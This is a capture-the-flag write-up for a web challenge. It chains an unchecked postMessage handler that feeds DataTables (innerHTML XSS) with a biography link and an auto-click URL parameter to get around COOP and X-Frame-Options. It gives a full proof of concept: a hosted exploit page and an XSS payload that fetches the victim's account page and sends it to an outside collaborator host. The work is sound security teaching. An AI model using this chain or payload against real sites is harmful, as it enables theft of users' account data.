# web-open-sesame

**Category:** web  
**Author:** kodz

## Description

When they came to the rock, the captain went up to it and said: 'Open Sesame!'.
Immediately the door opened, and the thieves entered the cave. When they had all gone in, the door closed again of itself.

Note: Use 'http://localhost:3000' as the target URL in your exploit.


## Writeup

### postMessage sink

Inside of `views/account.js` there's an interesting postMessage sink that does not check the origin of the incoming message at all:
```js
$(window).on('message', function(e) {
          var msg = e.originalEvent.data;
          if (msg && msg.type === 'wishlist') {
            if ($.fn.DataTable.isDataTable('#wishlist-table')) {
              $('#wishlist-table').DataTable().destroy();
              $('#wishlist-table').empty();
            }
            $('#wishlist-table').DataTable({
              data: msg.items,
              columns: [
                { data: 'item_name', title: 'Item' },
                { data: 'rarity', title: 'Rarity' },
                { data: 'value', title: 'Value' },
                { data: 'added_at', title: 'Added' }
              ],
              language: {
                emptyTable: 'Your wishlist is empty. Browse the cave to add treasures!'
              }
            });
          }
```

An interesting thing about JQuery's `DataTable()` function is that it uses `.innerHTML` while inserting columns into the DOM, which allows an easy XSS.

### Chaining gadgets to bypass COOP

That should be easy enough, what is the issue?

Well, let's take a look at `server.js`:

```js
app.use((req, res, next) => {
  res.setHeader("Cross-Origin-Opener-Policy", "same-origin-allow-popups");
  res.setHeader("X-Frame-Options", "DENY");
  next();
});
```

This is an interesting hardening - there's no way to gain a `window` reference to the target, neither via an `<iframe>` or `window.open()`.
However, since COOP is set to `same-origin-allow-popups` this means that if we make a "same origin popup" we can still have this window reference.

Now, let's take a look at what kind of gadgets we can find to make this work. 

* `views/profile.js`

```js
          $.get('/api/profile/${username}', function(data) {
          $('#bio-content').html(DOMPurify.sanitize(data.biography, { ADD_ATTR: ['target', 'aria-label', 'role', 'tabindex', 'title'] }));

          // Accessibility: auto-click helper for assistive tools
          var clickTarget = new URLSearchParams(window.location.search).get('click');
          if (clickTarget) {
            $(clickTarget).first()[0].click();
          }
        });
```

It seems that we can have markdown / HTML injection inside of the `biography` field, however it's not possible to turn it into an XSS. `target` is an allowed attribute which we can set to `_blank` to force open something in a new tab though.

Another interesting thing is the `clickTarget`, we can abuse it to force a click on any selector in the DOM we want.

This means we can use a payload like the following to gain a `window` reference, even with COOP/XFO!

```html
<a href="http://na8lm7by.instances.httpworkbench.com/" target="_blank" rel="opener" id="exp">Click me</a>
```

and then to get the payload triggered we can simply open `/profile/<attacker-username>?click=%23exp` which is exactly the URL we send to the bot to exfiltrate the flag.


### Exploit PoC steps:

1. Register an account with username i.e `attacker` and the following biography:

```html
<a href="http://attacker.com/exploit.html" target="_blank" rel="opener" id="exp">Click me</a>
```

2. Host the following HTML at `http://attacker.com/exploit.html`:

```html
<!DOCTYPE html>
<html>
    <head></head>
    <body>
    <script>
        let BASE_URL = 'http://localhost:3000';
        
        setTimeout(() => {
            window.opener.location = `${BASE_URL}/my-account`;

            setTimeout(() => {
                window.opener.postMessage({
                    type: 'wishlist',
                    items: [{
                    item_name: '<img src=x onerror="fetch(`/my-account`).then(res => res.text()).then(data => { navigator.sendBeacon(`http://hk5y3dlu54vaycujegl1ioshd8jz7pve.oastify.com/e`,JSON.stringify(data)) })">',
                    rarity: 'Legendary',
                    value: '999',
                    added_at: '2026-01-01'
                    }]
                }, '*');
            }, 1500);
        }, 4000);
    </script>
    </body>
</html>
```

3. Send the following URL to the bot: `http://localhost:3000/profile/attacker?click=%23exp`

4. You will recieve the flag at the previously set Burp Collaborator / Exfil server URL in the exploit :)